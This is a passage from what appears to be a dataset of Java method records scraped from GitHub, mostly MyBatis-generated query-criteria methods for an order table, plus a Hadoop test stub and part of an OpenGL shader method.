"andItemPriceIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceIsNotNull() {            addCriterion(\"item_price is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceEqualTo(BigDecimal value) {            addCriterion(\"item_price =\", value, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceNotEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceNotEqualTo(BigDecimal value) {            addCriterion(\"item_price <>\", value, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceGreaterThan", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceGreaterThan(BigDecimal value) {            addCriterion(\"item_price >\", value, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceGreaterThanOrEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceGreaterThanOrEqualTo(BigDecimal value) {            addCriterion(\"item_price >=\", value, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceLessThan", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceLessThan(BigDecimal value) {            addCriterion(\"item_price <\", value, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceLessThanOrEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceLessThanOrEqualTo(BigDecimal value) {            addCriterion(\"item_price <=\", value, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceIn", "params": ["List<BigDecimal>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceIn(List<BigDecimal> values) {            addCriterion(\"item_price in\", values, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceNotIn", "params": ["List<BigDecimal>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceNotIn(List<BigDecimal> values) {            addCriterion(\"item_price not in\", values, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceBetween", "params": ["BigDecimal", "BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceBetween(BigDecimal value1, BigDecimal value2) {            addCriterion(\"item_price between\", value1, value2, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andItemPriceNotBetween", "params": ["BigDecimal", "BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andItemPriceNotBetween(BigDecimal value1, BigDecimal value2) {            addCriterion(\"item_price not between\", value1, value2, \"itemPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountIsNull() {            addCriterion(\"amount is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountIsNotNull() {            addCriterion(\"amount is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountEqualTo(Integer value) {            addCriterion(\"amount =\", value, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountNotEqualTo(Integer value) {            addCriterion(\"amount <>\", value, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountGreaterThan(Integer value) {            addCriterion(\"amount >\", value, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountGreaterThanOrEqualTo(Integer value) {            addCriterion(\"amount >=\", value, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountLessThan(Integer value) {            addCriterion(\"amount <\", value, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountLessThanOrEqualTo(Integer value) {            addCriterion(\"amount <=\", value, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountIn(List<Integer> values) {            addCriterion(\"amount in\", values, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountNotIn(List<Integer> values) {            addCriterion(\"amount not in\", values, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountBetween(Integer value1, Integer value2) {            addCriterion(\"amount between\", value1, value2, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andAmountNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andAmountNotBetween(Integer value1, Integer value2) {            addCriterion(\"amount not between\", value1, value2, \"amount\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceIsNull() {            addCriterion(\"order_price is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceIsNotNull() {            addCriterion(\"order_price is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceEqualTo(BigDecimal value) {            addCriterion(\"order_price =\", value, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceNotEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceNotEqualTo(BigDecimal value) {            addCriterion(\"order_price <>\", value, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceGreaterThan", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceGreaterThan(BigDecimal value) {            addCriterion(\"order_price >\", value, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceGreaterThanOrEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceGreaterThanOrEqualTo(BigDecimal value) {            addCriterion(\"order_price >=\", value, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceLessThan", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceLessThan(BigDecimal value) {            addCriterion(\"order_price <\", value, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceLessThanOrEqualTo", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceLessThanOrEqualTo(BigDecimal value) {            addCriterion(\"order_price <=\", value, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceIn", "params": ["List<BigDecimal>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceIn(List<BigDecimal> values) {            addCriterion(\"order_price in\", values, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceNotIn", "params": ["List<BigDecimal>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceNotIn(List<BigDecimal> values) {            addCriterion(\"order_price not in\", values, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceBetween", "params": ["BigDecimal", "BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceBetween(BigDecimal value1, BigDecimal value2) {            addCriterion(\"order_price between\", value1, value2, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andOrderPriceNotBetween", "params": ["BigDecimal", "BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andOrderPriceNotBetween(BigDecimal value1, BigDecimal value2) {            addCriterion(\"order_price not between\", value1, value2, \"orderPrice\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdIsNull() {            addCriterion(\"promo_id is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdIsNotNull() {            addCriterion(\"promo_id is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdEqualTo(Integer value) {            addCriterion(\"promo_id =\", value, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdNotEqualTo(Integer value) {            addCriterion(\"promo_id <>\", value, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdGreaterThan(Integer value) {            addCriterion(\"promo_id >\", value, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdGreaterThanOrEqualTo(Integer value) {            addCriterion(\"promo_id >=\", value, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdLessThan(Integer value) {            addCriterion(\"promo_id <\", value, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdLessThanOrEqualTo(Integer value) {            addCriterion(\"promo_id <=\", value, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdIn(List<Integer> values) {            addCriterion(\"promo_id in\", values, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdNotIn(List<Integer> values) {            addCriterion(\"promo_id not in\", values, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdBetween(Integer value1, Integer value2) {            addCriterion(\"promo_id between\", value1, value2, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoIdNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoIdNotBetween(Integer value1, Integer value2) {            addCriterion(\"promo_id not between\", value1, value2, \"promoId\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getCondition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getCondition() {            return condition;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getValue() {            return value;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getSecondValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getSecondValue() {            return secondValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isNoValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isNoValue() {            return noValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isSingleValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isSingleValue() {            return singleValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isBetweenValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isBetweenValue() {            return betweenValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "isListValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isListValue() {            return listValue;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getTypeHandler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getTypeHandler() {            return typeHandler;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/OrderDOExample.java", "stars": "1", "class": {"name": "Criterion", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "testAdditionalNamenodes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void testAdditionalNamenodes() {//    Props testProps = new Props();//    HadoopJobUtils.addAdditionalNamenodesToProps(testProps, \"hdfs://testNN:9000\");//    Assert.assertEquals(\"hdfs://testNN:9000\", testProps.get(\"other_namenodes\"));////    testProps = new Props();//    testProps.put(\"other_namenodes\", \"hdfs://testNN1:9000,hdfs://testNN2:9000\");//    HadoopJobUtils.addAdditionalNamenodesToProps(testProps, \"hdfs://testNN:9000\");//    Assert.assertEquals(\"hdfs://testNN1:9000,hdfs://testNN2:9000,hdfs://testNN:9000\",//        testProps.get(\"other_namenodes\"));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/test/java/azkaban/jobtype/TestHadoopJobUtilsAdditionalNamenodes.java", "stars": "18", "class": {"name": "TestHadoopJobUtilsAdditionalNamenodes", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getShader", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"                + \"precision mediump float;\\n\"                + \"uniform samplerExternalOES tex_sampler_0;\\n\"                + \"uniform samplerExternalOES tex_sampler_1;\\n\"                + \"uniform samplerExternalOES tex_sampler_2;\\n\"                + \" float scale;\\n\" + \" float shift_scale;\\n\"                + \" float hist_offset;\\n\" + \" float hist_scale;\\n\"                + \" float density_offset;\\n\" + \" float density_scale;\\n\"                + \"varying vec2 vTextureCoord;\\n\" + \"void main() {\\n\"                + \"  shift_scale = \"                + (1.0f / 256f)                + \";\\n\"                + \"  hist_offset = \"                + (0.5f / 766f)                + \";\\n\"                + \"  hist_scale = \"                + (765f / 766f)                + \";\\n\"                + \"  density_offset = \"                + (0.5f / 1024f)                + \";\\n\"                + \"  density_scale = \"                + (1023f / 1024f)                + \";\\n\"                + \"  scale = \"                + scale                + \";\\n\"                + \"  const vec3 weights = vec3(0.33333, 0.33333, 0.33333);\\n\"                + \"  vec4 color = texture2D(tex_sampler_0, vTextureCoord);\\n\"                + \"  float energy = dot(color.rgb, weights);\\n\"                + \"  float mask_value = energy - 0.5;\\n\"                + \"  float alpha;\\n\"                + \"  if (mask_value > 0.0) {\\n\"                + \"    alpha = (pow(2.0 * mask_value, 1.5) - 1.0) * scale + 1.0;\\n\"                + \"  } else { \\n\"                + \"    alpha = (pow(2.0 * mask_value, 2.0) - 1.0) * scale + 1.0;\\n\"                + \"  }\\n\"                + \"  float index = energy * hist_scale + hist_offset;\\n\"                + \"  vec4 temp = texture2D(tex_sampler_1, vec2(index, 0.5));\\n\"                + \"  float value = temp.g + temp.r * shift_scale;\\n\"                + \"  index = value * density_scale + density_offset;\\n\"                + \"  temp = texture2D(tex_sampler_2, vec2(index, 0.5));\\n\"                + \"  value = temp.g + temp.r * shift_scale;\\n\"                + \"  float dst_energy = energy * alpha + value * (1.0 - alpha);\\n\"                + \"  float max_energy = energy / max(color.r, max(color.g, 